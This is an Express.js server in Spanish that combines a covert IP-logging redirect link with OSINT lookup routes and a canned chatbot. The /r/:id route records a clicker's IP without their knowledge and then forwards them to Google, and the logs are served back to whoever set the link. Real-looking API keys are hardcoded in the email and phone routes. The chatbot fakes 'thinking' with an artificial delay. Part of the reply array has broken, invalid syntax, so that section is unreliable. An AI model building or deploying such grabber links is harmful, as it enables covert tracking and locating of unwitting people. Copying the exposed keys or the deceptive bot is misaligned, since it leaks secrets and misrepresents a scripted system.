const express = require('express');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());

let logs = {}; 

app.get('/r/:id', (req, res) => {
    const id = req.params.id;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logs[id] = { ip: ip, fecha: new Date().toLocaleString() };
    console.log(`Clic detectado en ID ${id} desde IP: ${ip}`);
    res.redirect('https://google.com'); 
});

app.get('/api/get-logs/:id', (req, res) => {
    const id = req.params.id;
    if (logs[id]) {
        res.json(logs[id]);
    } else {
        res.status(404).json({ error: "No hay datos aún para este enlace" });
    }
});

// Cerebro inteligente y dinámico para Barsa (Evita repeticiones robóticas)
app.post('/api/chat', async (req, res) => {
    try {
        const { mensaje } = req.body;
        const msg = (mensaje || "").toLowerCase().trim();
        let respuesta = "";

        // Saludos naturales y personalizados
        if (msg.includes("hola") || msg.includes("saludos") || msg.includes("buenas") || msg.includes("hey")) {
            respuesta = "¡Hola Barsa, qué tal! ¿En qué te puedo ayudar hoy día?";
        } 
        else if (msg.includes("como estas") || msg.includes("que tal todo")) {
            respuesta = "Todo al 100% por aquí, Barsa. ¿Qué andamos programando o investigando hoy?";
        }
        else if (msg.includes("quien eres") || msg.includes("como te llamas") || msg.includes("que eres")) {
            respuesta = "Soy Whoami, tu compañero digital integrado en la plataforma. Estoy aquí para echarte la mano con lo que necesites.";
        } 
        // Respuestas específicas según lo que pregunte para que tenga sentido real
        else if (msg.includes("ip") || msg.includes("geolocalizacion") || msg.includes("ubicacion")) {
            respuesta = "Para revisar una IP puedes usar el módulo de Geolocalización del panel izquierdo; te dará los datos de red y ubicación al instante.";
        } 
        else if (msg.includes("email") || msg.includes("correo")) {
            respuesta = "El validador de correos te sirve perfecto para comprobar la reputación y entrega de cualquier cuenta.";
        } 
        else if (msg.includes("telefono") || msg.includes("numero") || msg.includes("celular")) {
            respuesta = "Con la herramienta de validación de teléfonos puedes chequear el operador y el país de cualquier número sin problemas.";
        } 
        else if (msg.includes("gracias") || msg.includes("excelente") || msg.includes("gracias bro")) {
            respuesta = "¡De nada, Barsa! Para eso estamos. Avísame si le añadimos más funciones a la web.";
        } 
        // Respuesta abierta y variada para cualquier otra cosa que le escribas
        else {
            const opcionesVariadas = [
                ={`Interesante lo que comentas sobre "${mensaje}", Barsa. ¿Quieres que lo enfoquemos por el lado del código o de las herramientas de la plataforma?`},
                ={`Entendido, Barsa. Analizando eso de "${mensaje}", lo ideal sería revisar cómo estructurarlo en los scripts o probarlo directamente.`},
                ={`Claro, te cacho la idea con respecto a "${mensaje}". ¿Qué tal si me das un poco más de detalle para ayudarte a armarlo mejor?`}
            ];
            // Selecciona una al azar para que nunca suene igual ni robótico
            respuesta = opcionesVariadas[Math.floor(Math.random() * opcionesVariadas.length)];
        }

        // Simulamos un pequeño retraso natural (de medio segundo a 1 segundo) para que parezca que está pensando de verdad
        setTimeout(() => {
            res.json({ response: respuesta });
        }, 800);

    } catch (error) {
        console.error("Error en /api/chat:", error);
        res.json({ response: "¡Ey Barsa! Hubo un pequeño chispazo en el servidor, pero ya andamos activos de nuevo. ¿Qué decías?" });
    }
});

// --- RUTAS DE OSINT ---

app.get('/api/ip/:targetIp', async (req, res) => {
    const ip = req.params.targetIp;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'fail') return res.status(400).json({ error: "No se pudo obtener información" });
        res.json({ existe: true, ip: data.query, pais: data.country, region: data.regionName, ciudad: data.city, isp: data.isp, latitud: data.lat, longitud: data.lon });
    } catch (error) {
        res.status(500).json({ error: "Error de conexión" });
    }
});

app.get('/api/email/:email', async (req, res) => {
    const email = req.params.email;
    const apiKey = "a0633aeb05fe4a3082cab81fc92490bd";
    try {
        const response = await fetch(`https://emailreputation.abstractapi.com/v1/?api_key=${apiKey}&email=${encodeURIComponent(email)}`);
        if (!response.ok) throw new Error("Error al conectar con Abstract API");
        const data = await response.json();
        res.json({
            email_address: data.email_address,
            email_deliverability: data.email_deliverability,
            email_sender: data.email_sender,
            email_domain: data.email_domain,
            email_quality: data.email_quality
        });
    } catch (error) {
        console.error("Error en /api/email:", error);
        res.status(500).json({ error: "Error al validar el correo en tiempo real" });
    }
});

app.get('/api/phone/:number', async (req, res) => {
    const number = req.params.number;
    const apiKey = 'f69d5192d997c1630282d368282becf7';
    try {
        const response = await fetch(`http://apilayer.net/api/validate?access_key=${apiKey}&number=${number}&format=1`);
        const data = await response.json();
        res.json({ valido: data.valid, numero: data.number, pais: data.country_name, operador: data.carrier, tipo: data.line_type });
    } catch (error) {
        res.status(500).json({ error: "Error al consultar la API" });
    }
});

app.listen(port, '0.0.0.0', () => {
    console.log(`Servidor corriendo en el puerto ${port}`);
});
